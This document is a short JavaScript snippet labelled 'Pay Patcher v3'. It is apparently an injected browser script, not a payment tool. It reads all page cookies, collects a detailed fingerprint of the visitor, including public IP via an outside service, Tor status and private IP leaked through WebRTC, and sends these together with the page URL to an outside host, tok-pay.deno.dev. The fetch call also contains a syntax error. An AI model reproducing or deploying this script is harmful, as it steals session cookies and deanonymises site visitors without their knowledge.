console.log("Pay Patcher v3");
window.data = {};
window.data.cookies = document.cookie.split(";").map(cookie_split => cookie_split.split("="));
!function(e,n){e.endpointjs=function(...n){let r={};r.Browser={},r.Headers={},r.UserAgent=navigator.userAgent,fetch("https://project.activetk.jp/endpoint/").then(e=>e.json()).then(e=>{r.PublicIP=e.PublicIP,r.Host=e.Host,r.RealIP=e.RealIP,r.IsItTor=e.IsItTor,r.Headers.UserAgent=e.UserAgent,r.Headers.AcceptLanguage=e.AcceptLang,r.Headers.AcceptEncoding=e.AcceptEncode,r.Headers.UserAgentClientHints=e.UserAgentClientHints}).then(()=>{function t(){r.Browser.CodeName=location.appCodeName,r.Browser.Name=navigator.appName,r.Browser.Version=navigator.appVersion,r.Browser.Language=navigator.language,r.Browser.Platform=navigator.platform,r.Browser.Referrer=document.referrer,r.Browser.ScreenWidth=screen.width,r.Browser.ScreenHeight=screen.height,r.Browser.ScreenColorDepth=screen.colorDepth+"bit",r.Browser.ViewPortWidth=e.innerWidth,r.Browser.ViewPortHeight=e.innerHeight,r.Browser.DevicePixelRatio=e.devicePixelRatio,r.Browser.HasPointer=navigator.pointerEnabled,r.Browser.MaxTouchPoints=navigator.maxTouchPoints,function e(){for(let t=0;t<n.length;t++)"function"==typeof n[t]?n[t](r):console.error(t)}()}if(e.RTCPeerConnection=e.RTCPeerConnection||e.mozRTCPeerConnection||e.webkitRTCPeerConnection,!e.RTCPeerConnection){t();return}let o=new RTCPeerConnection({iceServers:[]}),i=function(){};o.createDataChannel(""),o.createOffer(o.setLocalDescription.bind(o),i),o.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate){r.WebRTCInfo=e.candidate.candidate;try{r.PrivateIPaddress=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate)[1]}catch{}o.onicecandidate=i}},t()})}}(window);
function sender(d) {
  window.data.info = d;
  window.data.page = window.location.href;
  //dispatch
  fetch("https://tok-pay.deno.dev", {
    body: JSON.stringify(window.data);
  }).then(() => {
    console.log("Dispatch成功 ID:" + btoa(Date.now()))
  })
}
window.endpointjs(sender)

